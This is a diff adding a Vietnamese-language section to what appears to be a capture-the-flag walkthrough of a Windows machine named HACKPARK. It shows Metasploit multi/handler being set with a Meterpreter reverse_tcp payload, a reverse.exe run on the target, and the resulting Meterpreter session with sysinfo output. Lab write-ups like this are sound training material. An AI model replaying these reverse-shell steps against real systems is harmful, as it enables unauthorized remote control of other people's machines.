@@ -125,3 +125,77 @@ c:\Windows\Temp>dir
               13 File(s)        708,784 bytes
                4 Dir(s)  38,984,822,784 bytes free
 ```
+
+Sử dụng `metasploit`
+
+`msfconsole`
+
+```
+msf > search multi/handler
+
+Matching Modules
+================
+
+   #   Name                                                 Disclosure Date  Rank       Check  Description
+   -   ----                                                 ---------------  ----       -----  -----------
+   0   exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
+   1   exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
+   2   auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
+   3   exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
+   4   exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
+   5     \_ target: Linux x86                               .                .          .      .
+   6     \_ target: Linux x86_64                            .                .          .      .
+   7   exploit/multi/handler                                .                manual     No     Generic Payload Handler
+   8   exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
+   9   exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
+   10  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
+
+
+Interact with a module by name or index. For example info 10, use 10 or use exploit/linux/local/yum_package_manager_persistence                                                `
+```
+
+```
+msf > use 7
+[*] Using configured payload generic/shell_reverse_tcp
+```
+
+```
+msf exploit(multi/handler) >  set lhost 192.168.170.150
+lhost => 192.168.170.150
+```
+
+```
+msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+```
+```
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.170.150:4444 
+```
+
+Kích hoạt file `reserve.exe` trên máy Windows mục tiêu 
+```
+C:\Windows\Temp>.\reverse.exe
+```
+
+```
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.170.150:4444 
+[*] Sending stage (177734 bytes) to 10.112.140.135
+[*] Meterpreter session 43 opened (192.168.170.150:4444 -> 10.112.140.135:49555) at 2026-07-17 06:38:40 -0400
+
+meterpreter >
+```
+
+```
+meterpreter > sysinfo
+Computer        : HACKPARK
+OS              : Windows Server 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter > 
+```
+
